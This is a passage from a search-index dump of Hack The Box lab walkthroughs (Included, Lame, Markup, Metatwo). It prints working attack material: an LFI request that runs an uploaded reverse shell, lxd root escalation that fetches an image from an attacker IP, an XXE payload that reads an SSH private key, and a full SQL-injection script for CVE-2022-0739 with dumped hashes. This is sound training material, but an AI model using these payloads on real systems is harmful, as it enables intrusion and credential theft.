(admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nmike:x:1000:1000:mike:/home/mike:/bin/bash\ntftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin\n</code></pre> <p>Something interesting is that after user mike, there is a service/user: tftp. Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides. It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP. </p> <p>UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets. It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP. Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.</p> <pre><code>sudo nmap -sU 10.129.95.185   \n</code></pre> <p>You can use metasploit or python to check if can upload/download files. Module <code>auxiliary/admin/tftp/tftp_transfer_util</code></p> <p>And also you can exploit it manually. Install tftp client:</p> <pre><code># Install tftp client\nsudo apet install tftp\n</code></pre> <p>Also, check for manual and available commands:</p> <pre><code>man tftp\n</code></pre> <p>Upload your pentesmonkey shell with:</p> <pre><code>put pentesmonkey.php\n</code></pre> <p>Where does it get uploaded? Depends. But The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The directory is configured there under the parameter <code>TFTP_DIRECTORY=</code>. With that information, you can access the directory and from there launch your reverse shell. </p> <p>Let's do it. Request in Burpsuite:</p> <pre><code>GET /?file=../../../../../../etc/default/tftpd-hpa HTTP/1.1\nHost: 10.129.95.185\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>Response:</p> <pre><code>HTTP/1.1 200 OK\nDate: Mon, 08 May 2023 07:27:32 GMT\nServer: Apache/2.4.29 (Ubuntu)\nVary: Accept-Encoding\nContent-Length: 125\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n# /etc/default/tftpd-hpa\n\nTFTP_USERNAME=\"tftp\"\nTFTP_DIRECTORY=\"/var/lib/tftpboot\"\nTFTP_ADDRESS=\":69\"\nTFTP_OPTIONS=\"-s -l -c\"\n</code></pre> <p>Now, open netcat on one terminal</p> <pre><code>nc -lnvp 1234\n</code></pre> <p>Launch your shell by visiting in the browser:</p> <pre><code>http://10.129.95.185/?file=../../../../../..//var/lib/tftpboot/pentesmonkey.php\n</code></pre> <p>Spawn a shell.</p> <pre><code>SHELL=/bin/bash script -q /dev/null\nCtrl-Z\nstty raw -echo\nfg\nreset\nxterm\n</code></pre> <p>Browse around. Credentials for user mike are at /var/wwww/html/.htpasswd:</p> <pre><code>su mike\n# Enter password: Sheffield19\n</code></pre> <p>And get the user.txt flag:</p> <pre><code>cd\nls -la\ncat user.txt\n</code></pre>","tags":["walkthrough","lxd exploitation","port 69","tftp","privilege escalation"]},{"location":"htb-included/#privilege-escalation","title":"Privilege escalation","text":"<pre><code>whoami\npwd\nid\ngroups\nuname -a\nlsb_release -a\n</code></pre> <p>Information retrieved:</p> <pre><code>uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)\ngroups\nmike lxd\nuname -a\nLinux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 18.04.5 LTS\nRelease:        18.04\nCodename:       bionic\n</code></pre> <p>After looking for \"exploit ubuntu 18.04.5 LTS\" there exists a exploit that uses lxd service, which makes sense after reading the information retrieved. About lxd privilege escalation.</p> <p>LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</p> <p>Basically, as mike we belong to group lxd. Let's exploit this:</p> <p>Steps to be performed on the attacker machine:</p> <pre><code># Download build-alpine in your local machine through the git repository:\ngit clone https://github.com/saghul/lxd-alpine-builder.git\n\n# Execute the script \u201cbuild -alpine\u201d that will build the latest Alpine image as a compressed file, this step must be executed by the root user.\ncd lxd-alpine-builder\nsudo ./build-alpine\n\n# This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.\n</code></pre> <p>Steps to be performed on the victim machine:</p> <pre><code># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:\nwget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz\n\n# After the image is built it can be added as an image to LXD as follows:\nlxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage\n\n# List available images:\nlxc image list\n\n# Initiate your image inside a new container\nlxc init myimage ignite -c security.privileged=true\n\n# Mount the container inside the /root directory\nlxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\n\n# Initialize the container\nlxc start ignite\n\n# Launch a shell command in the container\nlxc exec ignite /bin/sh\n</code></pre> <p>Now, we should be root:</p> <pre><code>whoami\ncd /\nfind . -name root.txt 2&gt;/dev/null\n</code></pre>","tags":["walkthrough","lxd exploitation","port 69","tftp","privilege escalation"]},{"location":"htb-lame/","title":"HTB Lame","text":"<pre><code># Reconnaissance\nnmap -sC -sV $IP -Pn\n</code></pre> <pre><code>PORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)\n|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h00m28s, deviation: 2h49m43s, median: 27s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2023-04-18T17:35:18-04:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 25444/tcp): CLEAN (Timeout)\n|   Check 2 (port 29825/tcp): CLEAN (Timeout)\n|   Check 3 (port 9648/udp): CLEAN (Timeout)\n|   Check 4 (port 21091/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nNSE: Script Post-scanning.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.50 seconds\n</code></pre>","tags":["walkthrough","smb vulnerability","metasploit"]},{"location":"htb-lame/#enumeration","title":"Enumeration","text":"<p>Samba smbd 3.0.20-Debian is vulnerable. </p> <pre><code>smbclient -L \\\\$IP\n</code></pre> <p>And enumerate shared resources:</p> <pre><code>smbmap -H $IP\n</code></pre> <pre><code>[+] IP: 10.129.228.86:445       Name: unknown                                           \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        tmp                                                     READ, WRITE     oh noes!\n        opt                                                     NO ACCESS\n        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))\n        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))\n</code></pre> <p>tmp share has READ and WRITE permissions.</p> <pre><code>msfconsole\nuse exploit/multi/samba/usermap_script\n# configure it and run it\n</code></pre>","tags":["walkthrough","smb vulnerability","metasploit"]},{"location":"htb-markup/","title":"Markup -  A HTB machine","text":"<pre><code>nmap -sC -A 10.129.95.192 -Pn \n</code></pre> <p>Open ports: 22, 80 and 443.</p> <p>In the browser, there is a login panel. Try typical credentials. admin and password work. </p> <p>Locate the form to order an item. Capture the request with burp:</p> <pre><code>POST /process.php HTTP/1.1\nHost: 10.129.95.192\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: text/xml\nContent-Length: 108\nOrigin: http://10.129.95.192\nConnection: close\nReferer: http://10.129.95.192/services.php\nCookie: PHPSESSID=1gjqt353d2lm5222nl3ufqru10\n\n&lt;?xml version = \"1.0\"?&gt;&lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;Home Appliances&lt;/item&gt;&lt;address&gt;1&lt;/address&gt;&lt;/order&gt;\n</code></pre> <p>Playing around with the request (for instance, nesting some xml) you can check that it's possible to escape the xml tags. This request contains a xml external entity XEE vulnerability.</p> <p>From some responses like the one below (and also from nmap scanning) you know that server runs on a windows:</p> <pre><code>:  DOMDocument::loadXML(): Opening and ending tag mismatch: order line 1 and item in Entity, line: 1 in &lt;b&gt;C:\\xampp\\htdocs\\process.php\n</code></pre> <p>Also, from source code you know there might be a user called daniel:</p> <p></p> <p>As part of a possible exploitation we could try to check if there are ssh private key saved in that user's folder.</p> <pre><code>POST /process.php HTTP/1.1\nHost: 10.129.95.192\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: text/xml\nContent-Length: 182\nOrigin: http://10.129.95.192\nConnection: close\nReferer: http://10.129.95.192/services.php\nCookie: PHPSESSID=1gjqt353d2lm5222nl3ufqru10\n\n&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'&gt;]&gt;\n&lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;\n&amp;test;\n&lt;/item&gt;&lt;address&gt;1&lt;/address&gt;&lt;/order&gt;\n</code></pre> <p>The response will be id_rsa private key. More about XEE attacks.</p> <p>Now, as port 22 was open:</p> <pre><code>ssh -i id_rsa daniel@10.129.95.192\n</code></pre> <p>user.txt is in Desktop.</p>","tags":["walkthrough","windows","xxe"]},{"location":"htb-metatwo/","title":"Walkthrough - Metatwo, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-metatwo/#about-the-machine","title":"About the machine","text":"data Machine Metatwo Platform Hackthebox url link creator Naute OS Linux Release data 29 october 2022 Difficulty Easy Points 20 ip 10.10.11.186","tags":["walkthrough"]},{"location":"htb-metatwo/#getting-usertxt-flag","title":"Getting user.txt flag","text":"<p>Run:</p> <pre><code>export ip=10.10.11.186\n</code></pre>","tags":["walkthrough"]},{"location":"htb-metatwo/#reconnaissance","title":"Reconnaissance","text":"","tags":["walkthrough"]},{"location":"htb-metatwo/#active-scanning-serviceport-enumeration","title":"Active Scanning: Service/Port enumeration","text":"<p>Run nmap to enumerate open ports, services, OS, and traceroute. General enumeration not to make too much noise:</p> <pre><code>sudo nmap $ip -Pn\n</code></pre> <p>Results:</p> <pre><code>PORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n</code></pre> <p>Open 10.10.11.186 in the browser. A redirection to http://metapress.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:</p> <p>Open the /etc/hosts file with an editor. For instance, nano.</p> <pre><code>sudo nano /etc/hosts\n</code></pre> <p>Move the cursor to the end and add these lines:</p> <pre><code>10.10.11.186    metapress.htb\n</code></pre> <p>Now we can visit the site. The first thing we notice is that it is a WordPress. That means we can use a tool such as wpscan to enumerate resources in the target. As we desire also to know the installed plugins, we will perform an aggressive scan with the flag --plugins-detection. </p> <p>First, do the  generic scan:</p> <pre><code>wpscan --url http://metapress.htb\n</code></pre> <p>Results:</p> <pre><code>_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://metapress.htb/ [10.10.11.186]\n[+] Started: Sun Nov 13 14:58:36 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.18.0\n |  - X-Powered-By: PHP/8.0.24\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://metapress.htb/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://metapress.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).\n | Found By: Rss Generator (Passive Detection)\n |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;\n |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;\n\n[+] WordPress theme in use: twentytwentyone\n | Location: http://metapress.htb/wp-content/themes/twentytwentyone/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://metapress.htb/wpcontent/themes/twentytwentyone/readme.txt\n | [!] The version is out of date, the latest version is 1.7\n | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1\n | Style Name: Twenty Twenty-One\n | Style URI: https://wordpress.org/themes/twentytwentyone/\n | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:11 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:11\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n</code></pre> <p>Two interesting facts that may come into use later are:</p> <ul> <li>WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</li> <li>X-Powered-By: PHP/8.0.24</li> </ul> <p>So, we have a WordPress version 5.6.2 that is using a PHP version 8.0.24.</p> <p>After this, use the aggressive method to scan plugins:</p> <pre><code>wpscan --url http://metapress.htb --enumerate vp --plugins-detection aggressive\n</code></pre> <p>Since this method is really slow, we have some spare time to have a look at the html code with the inspector tool in our browser. This specific line catches our attention:</p> <pre><code>&lt;link rel=\"stylesheet\" id=\"bookingpress_fonts_css-css\" href=\"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10\" media=\"all\"&gt;\n</code></pre> <p>Sweet. In a very easy way, we've been able to spot an installed plugin and its version: bookingpress version 1.0.10. If we browse the site it's easy to get to http://metapress.htb/events/. Bookingpress plugin version 1.0.10 is vulnerable, so next step will be exploitation.</p>","tags":["walkthrough"]},{"location":"htb-metatwo/#initial-access","title":"Initial access","text":"<p>By searching for \"bookingpress 1.0.10\" in google, we can learn that there is a critical vulnerability associated with the plugin BookingPress version under 1.0.11. </p> <p>Description of CVE-2022-0739: The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection.</p> <p>We are going to exploit the vulnerability in three different ways:</p> <ul> <li>Using a python script.</li> <li>Using the curl command.</li> <li>Using a capture in Burp Suite.</li> </ul> <p>We will leave out of this write-up the tool sqlmap, that authomatizes the attack. Let's get dirty hands with code.</p> <p>Python script There is a git repo that exploits CVE-2022-0739. </p> <p>Let's see the python script:</p> <pre><code>import requests\nfrom json import loads\nfrom random import randint\nfrom argparse import ArgumentParser\n\np = ArgumentParser()\np.add_argument('-u', '--url', dest='url', help='URL of wordpress server with vulnerable plugin (http://example.domain)', required=True)\np.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user', required=True)\n\ntrigger = \") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -\"\ngainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'\n\n# Payload: ) AND ... -- - total(9)\ndef gen_payload(nonce, sqli_postfix, category_id=1):\n    return { \n        'action': 'bookingpress_front_get_category_services', # vulnerable action,\n        '_wpnonce': nonce,\n        'category_id': category_id,\n        'total_service': f'{randint(100, 10000)}{sqli_postfix}'\n    }\n\nif __name__ == '__main__':  \n    print('- BookingPress PoC')\n    i = 0\n    args = p.parse_args()\n    url, nonce = args.url, args.nonce\n    pool = requests.session()\n\n\n    # Check if the target is vulnerable\n    v_url = f'{url}/wp-admin/admin-ajax.php'\n    proof_payload = gen_payload(nonce, trigger)\n\n    res = pool.post(v_url, data=proof_payload)\n    try:\n        res = list(loads(res.text)[0].values())\n    except Exception as e:\n        print('-- Got junk... Plugin not vulnerable or nonce is incorrect')\n        exit(-1)\n    cnt = int(res[7])\n\n    # Capture hashes\n    print('-- Got db fingerprint: ', res[0])\n    print('-- Count of users: ', cnt)\n    for i in range(cnt):\n        try:\n            # Generate payload\n            user_payload = gen_payload(nonce, gainer.format(off=i))\n            u_data = list(loads(pool.post(v_url, user_payload).text)[0].values())\n            print(f'|{u_data[0]}|{u_data[1]}|{u_data[2]}|')\n        except: continue \n</code></pre> <p>Create a python script called bookingpress.py and give it execution permission:</p> <pre><code>sudo nano bookingpress.py\n# Now we paste the code and save changes with CTRL-X and Yes.\nchmod +x bookingpress.py\n</code></pre> <p>Bookingpress.py requires two arguments. First is \"url\" and second in \"nonce\". Wpnonce is generated during the registration of an event in the browser. To obtain it, book a spot in the calendar and capture that with BurpSuite. Here is the traffic intercepted:</p> <pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 95\nOrigin: http://metapress.htb\nConnection: close\nReferer: http://metapress.htb/events/\nCookie: PHPSESSID=akporp33a92q48gn0afe6akrkt\n\naction=bookingpress_front_get_timings&amp;service_id=1&amp;selected_date=2022-11-21&amp;_wpnonce=f26ed88649\n</code></pre> <p>Now execute the script:</p> <pre><code>python bookingpress.py -u metapress.htb -n f26ed88649\n</code></pre> <p>And results:</p> <pre><code>- BookingPress PoC\n-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1\n-- Count of users:  2\n|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|\n|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|\n</code></pre> <p>Curl command Also, we could use the following command:</p> <pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php'   --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=f26ed88649&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'\n</code></pre> <p>If you use it, remember to change the value of the NONCE parameter. Mine was f26ed88649.</p> <p>Capturing the request with Burp</p> <p>First, capture a request for an appointment booking with Burp Suite: </p> <pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1054\nOrigin: http://metapress.htb\nConnection: close\nReferer: http://metapress.htb/events/\nCookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d\n\naction=bookingpress_before_book_appointment&amp;appointment_data[selected_category]=1&amp;appointment_data[selected_cat_name]=&amp;appointment_data[selected_service]=1&amp;appointment_data[selected_service_name]=Startupmeeting&amp;appointment_data[selected_service_price]=$0.00&amp;appointment_data[service_price_without_currency]=0'-7502)+UNION+ALL+SELECT+group_concat(user_login),group_concat(user_pass),%40%40version_compile_os,1,2,3,4,5,6+from+wp_users--+-'&amp;appointment_data[selected_date]=2022-11-15&amp;appointment_data[selected_start_time]=10:00&amp;appointment_data[selected_end_time]=10:30&amp;appointment_data[customer_name]=&amp;appointment_data[customer_firstname]=lolo&amp;appointment_data[customer_lastname]=lolo&amp;appointment_data[customer_phone]=7777777777&amp;appointment_data[customer_email]=lolo@lolo.com&amp;appointment_data[appointment_note]=&lt;script&gt;alert(1)&lt;/script&gt;&amp;appointment_data[selected_payment_method]=&amp;appointment_data[customer_phone_country]=US&amp;appointment_data[total_services]=&amp;appointment_data[stime]=1668426666&amp;appointment_data[spam_captcha]=In6ygQvJD9EB&amp;_wpnonce=da775e35c6\n</code></pre> <p>As you can see in the captured traffic, since I restarted my machine due to non related issues, my wpnonce has shifted from f26ed88649 to da775e35c6. Send this request to the Repeater module (CTRL-R) and play with it. After a while testing it, I could craft this request:</p> <pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 112\nOrigin: http://metapress.htb\nConnection: close\nReferer: http://metapress.htb/events/\nCookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1;--+-'\n</code></pre> <p>For that, we have this response:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Mon, 14 Nov 2022 08:20:06 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nX-Powered-By: PHP/8.0.24\nAccess-Control-Allow-Origin: http://metapress.htb\nAccess-Control-Allow-Credentials: true\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\nContent-Length: 553\n\n[{\"bookingpress_service_id\":\"1\",\"bookingpress_category_id\":\"1\",\"bookingpress_service_name\":\"Startup meeting\",\"bookingpress_service_price\":\"$0.00\",\"bookingpress_service_duration_val\":\"30\",\"bookingpress_service_duration_unit\":\"m\",\"bookingpress_service_description\":\"Join us, we will celebrate our startup!\",\"bookingpress_service_position\":\"0\",\"bookingpress_servicedate_created\":\"2022-06-23 18:02:38\",\"service_price_without_currency\":0,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"}]\n</code></pre> <p>Cool. Let's now check what happens when you use this payload:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Mon, 14 Nov 2022 08:22:46 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nX-Powered-By: PHP/8.0.24\nAccess-Control-Allow-Origin: http://metapress.htb\nAccess-Control-Allow-Credentials: true\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\nContent-Length: 2\n\n[]\n</code></pre> <p>So, when the condition is false (1=2), we are having a different response from the server. This proves that we are facing a SQL Injection vulnerability.</p> <p>Also, we could run a scanner with the tool sqlmap to see if this request is vulnerable. Save this request in a file (in my case I will call it bookrequest:</p> <pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 112\nOrigin: http://metapress.htb\nConnection: close\nReferer: http://metapress.htb/events/\nCookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9\n</code></pre> <p>Now run sqlmap:</p> <pre><code>sqlmap -r bookrequest\n</code></pre> <p>Extract from the results:</p> <pre><code>[03:30:05] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nPOST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \nsqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:\n---\nParameter: total_service (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9) AND (SELECT 2533 FROM (SELECT(SLEEP(5)))kDHj) AND (2027=2027\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 9 columns\n    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a717071,0x467874624e5a4862654847417a50625064757853724c584c57504443685668756446725643566d56,0x7171627a71),NULL,NULL-- -\n---\n[03:30:17] [INFO] the back-end DBMS is MySQL\nweb application technology: Nginx 1.18.0, PHP 8.0.24\nback-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)\n[03:30:17] [WARNING] HTTP error codes detected during run:\n400 (Bad Request) - 123 times\n[03:30:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'\n</code></pre> <p>This saves us some time. Now we know there are two SQLi vulnerabilities. The first is a time-based blind one. And the second one is a 